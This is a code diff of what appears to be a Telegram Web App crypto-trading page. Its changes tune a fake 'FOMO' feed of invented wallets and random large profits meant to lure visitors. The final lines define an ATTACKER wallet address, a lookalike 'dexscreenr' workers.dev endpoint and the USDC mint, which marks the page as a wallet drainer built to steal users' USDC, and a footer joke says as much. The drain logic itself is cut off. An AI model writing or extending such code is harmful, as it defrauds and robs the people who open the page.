@@ -39,25 +39,38 @@
     box-shadow: 0 24px 48px rgba(0, 0, 0, 0.4);
   }
 
-  .header { width: 100%; text-align: center; margin-bottom: 24px; }
+  .header { width: 100%; text-align: center; margin-bottom: 20px; }
   .header span { font-size: 18px; font-weight: 800; letter-spacing: 1px; color: #ffffff; text-transform: uppercase; }
 
   .feed-container {
-    width: 100%; height: 200px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.05);
-    border-radius: 16px; padding: 12px; margin-bottom: 24px; overflow: hidden; display: flex; flex-direction: column; gap: 8px;
+    width: 100%; height: 220px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.05);
+    border-radius: 16px; padding: 10px; margin-bottom: 24px; overflow: hidden; display: flex; flex-direction: column; gap: 6px;
   }
   
   .feed-item {
     display: flex; justify-content: space-between; align-items: center; background: rgba(255, 255, 255, 0.03);
-    padding: 12px 10px; border-radius: 10px; font-size: 12px; flex-shrink: 0; white-space: nowrap;
-    animation: slideFadeIn 0.4s ease-out;
+    padding: 8px 10px; border-radius: 8px; font-size: 11px; flex-shrink: 0; white-space: nowrap;
+    animation: slideFadeIn 0.3s ease-out; transition: all 0.3s ease;
   }
 
-  @keyframes slideFadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes slideFadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
 
-  .feed-wallet { font-family: monospace; color: #71717a; font-size: 11px; width: 50px; }
-  .feed-token { font-weight: 600; color: #ffffff; flex: 1; text-align: left; padding-left: 6px; }
-  .feed-profit { font-weight: 700; font-size: 12px; text-align: right; }
+  .feed-item.mega-win {
+    background: rgba(20, 241, 149, 0.1);
+    border: 1px solid rgba(20, 241, 149, 0.4);
+    box-shadow: 0 0 10px rgba(20, 241, 149, 0.2);
+  }
+
+  .feed-item.event {
+    background: rgba(153, 69, 255, 0.1); /* Lila für Events */
+    border: 1px solid rgba(153, 69, 255, 0.3);
+    justify-content: center;
+    color: #e9d5ff;
+  }
+
+  .feed-wallet { font-family: monospace; color: #71717a; font-size: 10px; width: 45px; }
+  .feed-token { font-weight: 600; color: #ffffff; flex: 1; text-align: left; padding-left: 4px; }
+  .feed-profit { font-weight: 700; font-size: 11px; text-align: right; }
 
   .slider-container {
     width: 100%; height: 56px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
@@ -82,12 +95,13 @@
 
   .trust-footer {
     margin-top: 20px; font-size: 11px; color: #71717a; text-align: center; display: flex; align-items: center; justify-content: center;
-    min-height: 32px; overflow: hidden; width: 100%; padding: 0 10px;
+    height: 32px; overflow: hidden; width: 100%; padding: 0 10px;
   }
-  .footer-text { transition: opacity 0.4s ease, transform 0.4s ease; line-height: 1.4; }
+  
+  .footer-text { opacity: 1; transition: opacity 0.3s ease; line-height: 1.4; will-change: opacity; }
 
   .security-footer {
-    margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255, 255, 255, 0.05); font-size: 10px; color: #52525b;
+    margin-top: 16px; padding-top: 16px; border-top: 1px solid rgba(255, 255, 255, 0.05); font-size: 10px; color: #52525b;
     text-align: center; display: flex; align-items: center; justify-content: center; gap: 6px; width: 100%;
   }
   .security-footer svg { width: 12px; height: 12px; opacity: 0.7; }
@@ -118,57 +132,80 @@
     window.Telegram.WebApp.expand();
   }
 
+  // --- FLÜSSIGER FOOTER ---
   const footerTexts = ["ZachXBT is watching the chain.", "Did you know? The Kimchi premium trade was mostly fake volume.", "Your seed phrase is safe. We only want your USDC.", "I bought the top so you don't have to."];
   const footerEl = document.getElementById('footerText');
   let footerIndex = 0;
+  
   setInterval(() => {
     footerEl.style.opacity = 0;
     setTimeout(() => {
       footerIndex = (footerIndex + 1) % footerTexts.length;
       footerEl.textContent = footerTexts[footerIndex];
       footerEl.style.opacity = 1;
-    }, 400); 
-  }, 5000);
+    }, 300); 
+  }, 4000);
 
+  // --- FOMO FEED ---
   const feed = document.getElementById('feedContainer');
   const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...'];
   const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME'];
   
-  function addFeedItem(isMega = false) {
-    const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
-    const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
-    let pnlText = ""; let pnlColor = "#14F195"; 
-    if (isMega) {
-      const pnlPercent = Math.random() * 2500 + 1000;
-      const baseInvest = Math.random() * 400 + 100;
-      const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
-      pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
-    } else {
-      const isWin = Math.random() > 0.35;
-      if (isWin) {
-        const pnlPercent = Math.random() * 435 + 15;
-        const baseInvest = Math.random() * 1400 + 100;
+  function addFeedItem() {
+    const rand = Math.random();
+    
+    // 20% Chance auf ein Market Event (Milestone)
+    if (rand > 0.8) {
+      const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
+      const mcs = ['$1M', '$2M', '$5M', '$10M', '$50M', '$100M'];
+      const mc = mcs[Math.floor(Math.random() * mcs.length)];
+      
+      const el = document.createElement('div');
+      el.className = 'feed-item event';
+      el.innerHTML = `<span>🔥 $${token} has just hit ${mc} Market Cap!</span>`;
+      feed.prepend(el);
+    } 
+    // 80% Chance auf einen Trader (Buy/Sell)
+    else {
+      const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
+      const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
+      const isMegaWin = Math.random() > 0.8; 
+      let pnlText = ""; let pnlColor = "#14F195"; 
+      
+      if (isMegaWin) {
+        const pnlPercent = Math.random() * 2500 + 1000;
+        const baseInvest = Math.random() * 400 + 100;
         const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
         pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
       } else {
-        const pnlPercent = Math.random() * 35 + 5;
-        const baseInvest = Math.random() * 1800 + 200;
-        const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
-        pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
-        pnlColor = "#ef4444"; 
+        const isWin = Math.random() > 0.35;
+        if (isWin) {
+          const pnlPercent = Math.random() * 435 + 15;
+          const baseInvest = Math.random() * 1400 + 100;
+          const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+          pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
+        } else {
+          const pnlPercent = Math.random() * 35 + 5;
+          const baseInvest = Math.random() * 1800 + 200;
+          const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+          pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
+          pnlColor = "#ef4444"; 
+        }
       }
+      
+      const el = document.createElement('div');
+      el.className = isMegaWin ? 'feed-item mega-win' : 'feed-item';
+      el.innerHTML = `<span class="feed-wallet">${wallet}</span><span class="feed-token">$${token}</span><span class="feed-profit" style="color: ${pnlColor}">${pnlText}</span>`;
+      feed.prepend(el);
     }
-    const el = document.createElement('div');
-    el.className = 'feed-item';
-    el.innerHTML = `<span class="feed-wallet">${wallet}</span><span class="feed-token">$${token}</span><span class="feed-profit" style="color: ${pnlColor}">${pnlText}</span>`;
-    feed.prepend(el);
-    if (feed.children.length > 6) feed.lastChild.remove();
+
+    if (feed.children.length > 7) feed.lastChild.remove();
   }
 
   for(let i=0; i<5; i++) addFeedItem();
-  setInterval(addFeedItem, 3000);
-  setInterval(() => { addFeedItem(true); }, 10000);
+  setInterval(addFeedItem, 2500);
 
+  // --- LOGIK ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
